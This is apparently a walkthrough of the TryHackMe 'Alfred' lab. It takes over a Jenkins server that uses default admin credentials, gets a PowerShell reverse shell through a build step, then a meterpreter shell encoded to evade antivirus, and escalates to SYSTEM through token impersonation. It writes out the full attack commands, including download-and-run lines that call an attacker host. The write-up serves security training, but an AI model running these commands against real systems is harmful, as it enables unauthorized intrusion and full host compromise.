# TryHackMe: Alfred

#### [Task 1] Initial access

 In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

  
**How many ports are open? (TCP only)**

To find how many TCP ports are open you can use nmap.Run the command `nmap -sT 10.10.5.121` in your terminal and you will get the results displayed in the image below.

<img width="790" alt="1" src="https://user-images.githubusercontent.com/28839345/164770139-07140876-d846-4423-ab3a-5a7edb9310f0.png">

**What is the username and password for the log in panel(in the format username:password)**

After finding the TCP ports that are open you can see that there is a web server running in port 8080.Type in you browser http://10.10.5.121:8080 and you will be redirected in a login panel.

<img width="1260" alt="2" src="https://user-images.githubusercontent.com/28839345/164770148-9cdeea9e-c497-4bb6-8ba2-5df4f3cd991f.png">

The first thing you can try is use the username "admin" and password "admin".As you will see these are the credentials you need to log in as admin.
 
<img width="1263" alt="3" src="https://user-images.githubusercontent.com/28839345/164770151-7f76b1fe-8088-4fc1-8d16-adb24ed7e816.png"> 

<img width="1217" alt="4" src="https://user-images.githubusercontent.com/28839345/164770154-21e9fddc-8edf-443f-8e53-ddb6dc2d694d.png">
 
Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: _powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_

You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: _python3 -m http.server_

 Nishang has a repository of all sorts of tools for accessing, enumerating and escalating privileges on Windows machines. If you don’t have it already the first step is to download the repository using the following command `sudo git clone https://github.com/samratashok/nishang`.
 
<img width="805" alt="5" src="https://user-images.githubusercontent.com/28839345/164770156-6fabc5d9-83b7-45de-9141-732181753311.png">
 
 The next step is to  prepare the attacker machine by setting up a HTTP server in the same directory your Invoke-PowerShellTcp.ps1 script is in.(The directory i copied Invoke-PowerShellTcp.ps1 is the Desktop)
 
 Start the HTTP server using the command `python3 -m http.server`
 

<img width="954" alt="6" src="https://user-images.githubusercontent.com/28839345/164770159-04c46c5f-1af2-44ed-8017-0644c60c6f0a.png">

 The next step is to start a netcat listener using the command `nc -nlvp 4443`
 
<img width="471" alt="7" src="https://user-images.githubusercontent.com/28839345/164770160-16b40226-c043-43f4-93d0-acd57d31c430.png">

On Jenkins admin Panel click on the left hand menu "New item"


<img width="1207" alt="8" src="https://user-images.githubusercontent.com/28839345/164771448-e13843a2-a066-4bf9-a04f-978c1b5f0189.png">

 
<img width="1
            7" alt="8" src="https://user-images.githubusercontent.com/28839345/164770163-8e816b71-798f-46a9-933c-95dfdb139fd8.png">
 
 Enter a name for the project and click ‘Freestyle project’ and then click ‘Ok’ in the bottom left.
 

<img width="1226" alt="9" src="https://user-images.githubusercontent.com/28839345/164770168-384df549-250b-4e65-b5f3-8fb397965244.png">
 
 Scroll down to the ‘Build’ section and click the ‘Add build step’ dropdown. Click ‘Execute Windows batch command’.
 
<img width="1220" alt="10" src="https://user-images.githubusercontent.com/28839345/164770171-cf0fe03d-65f8-4e43-a435-3640b7980daf.png">
 
 Enter the following command in the "Execute Windows batch command"
 
`powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.49.68:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.49.68 -Port 4443`

Then click to 'Apply' and then 'save' in the bottom left corner.

<img width="1216" alt="11" src="https://user-images.githubusercontent.com/28839345/164770175-c1a723ea-7764-42d2-ade6-5ac4c8cfdbe1.png">

Lastly click on 'Build now'

<img width="1221" alt="12" src="https://user-images.githubusercontent.com/28839345/164770180-72d79978-6db7-4a47-9185-4305eecfdb15.png">

As you see you will connect to Jenkins with the reverse shell .

<img width="865" alt="13" src="https://user-images.githubusercontent.com/28839345/164770186-3ea1fe7f-4774-40d4-85a0-68fbbb064947.png">

<img width="725" alt="14" src="https://user-images.githubusercontent.com/28839345/164770188-ba434dfa-d4fb-477f-af70-6b31c2fc0905.png">

**What is the user.txt flag?**

Finally go to the directory show in the image bellow and use the command `cat user.txt` to get the flag for Task 1.

<img width="393" alt="15" src="https://user-images.githubusercontent.com/28839345/164770191-1969f65f-1d93-45c6-92ea-dca5b7e6115d.png">

#### [Task 2] Switching Shells

To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create the a windows meterpreter reverse shell using the following payload

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.17.43 LPORT=4444 -f exe -o reverse_shell.exe`

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

<img width="1075" alt="16" src="https://user-images.githubusercontent.com/28839345/164770193-de7a83ea-9c88-4e64-9a0a-d9ab6eb5d410.png">

After creating this payload, download it to the machine using the same method in the previous step:

Go to the netcat listener and type the following command

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.17.43:8000/reverse_shell.exe','reverse_shell.exe')"`

<img width="1151" alt="17" src="https://user-images.githubusercontent.com/28839345/164770194-7cb56622-4f58-4fbb-ada1-57cf5d23a98c.png">

Before running the reverse_shell, ensure the handler is set up in metasploit:

Start metasploit by running the command `msfconsole`.

Then run the following commands  to receive the incoming connection from you reverse shell using the metasploit handler.

`use exploit/multi/handler`
`set PAYLOAD windows/meterpreter/reverse_tcp`
`set LHOST 10.10.17.43`
`set LPORT 4444 `
`run`

<img width="697" alt="18" src="https://user-images.githubusercontent.com/28839345/164770197-b6dd4f02-cef3-4494-a01e-af9415578bc4.png">


 Once this is running, enter this command to start the reverse shell.
 
 `Start-Process "reverse_shell.exe"`
 
<img width="985" alt="19" src="https://user-images.githubusercontent.com/28839345/164770199-b75b1ba8-8b04-469e-aa2a-2ed0f413117e.png">

<img width="581" alt="20" src="https://user-images.githubusercontent.com/28839345/164770200-603f5de5-5c37-4207-a2eb-8ffda2ec7ba4.png">
 
**What is the final size of the exe payload that you generated?**

73802

#### [Task 3] Privilege Escalation

Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

-   user SIDs(security identifier)
-   group SIDs
-   privileges

amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

-   primary access tokens: those associated with a user account that are generated on log on
-   impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

-   SecurityAnonymous: current user/client cannot impersonate another user/client
-   SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
-   SecurityImpersonation: current user/client can impersonate the client's security context on the local system
-   SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

-   SeImpersonatePrivilege
-   SeAssignPrimaryPrivilege
-   SeTcbPrivilege
-   SeBackupPrivilege
-   SeRestorePrivilege
-   SeCreateTokenPrivilege
-   SeLoadDriverPrivilege
-   SeTakeOwnershipPrivilege
-   SeDebugPrivilege

**View all the privileges using whoami /priv**

<img width="1089" alt="22" src="https://user-images.githubusercontent.com/28839345/164770206-adc4ddb8-03c0-4cf4-9d01-a3a317607117.png">

  
You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: _load incognito_ to load the incognito module in metasploit. Please note, you may need to use the _use incognito_ command if the previous command doesn't work. Also ensure that your metasploit is up to date

<img width="1103" alt="21" src="https://user-images.githubusercontent.com/28839345/164770202-f35c2602-af84-498c-9e0d-488c38114ded.png">

  
**To check which tokens are available, enter the _list_tokens -g_. We can see that the _BUILTIN\Administrators_ token is available. Use the _impersonate_token "BUILTIN\Administrators"_ command to impersonate the Administrators token. What is the output when you run the _getuid_ command?**

<img width="710" alt="23" src="https://user-images.githubusercontent.com/28839345/164770212-c1e250fb-8863-4f72-85a0-9b6065da5ff7.png">

<img width="511" alt="24" src="https://user-images.githubusercontent.com/28839345/164770216-5d5ceda0-01d6-4c58-b104-2ab62c0c9391.png">

<img width="435" alt="25" src="https://user-images.githubusercontent.com/28839345/164770218-d3eb94e6-4914-4554-9bf2-469fa04ed70c.png">

NT AUTHORITY\SYSTEM

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the _ps_ command to view processes and find the PID of the services.exe process. Migrate to this process using the command _migrate PID-OF-PROCESS_

<img width="1208" alt="26" src="https://user-images.githubusercontent.com/28839345/164770220-896fc9e7-2240-4e5d-9c1a-b41b5986edd9.png">

<img width="1205" alt="27" src="https://user-images.githubusercontent.com/28839345/164770226-351bf6ad-a5fa-441f-a0c7-42ac2a5cf2b4.png">

**read the root.txt file at C:\Windows\System32\config**

<img width="467" alt="28" src="https://user-images.githubusercontent.com/28839345/164772359-0622d363-8e05-4f73-b995-2148c0b6f524.png">

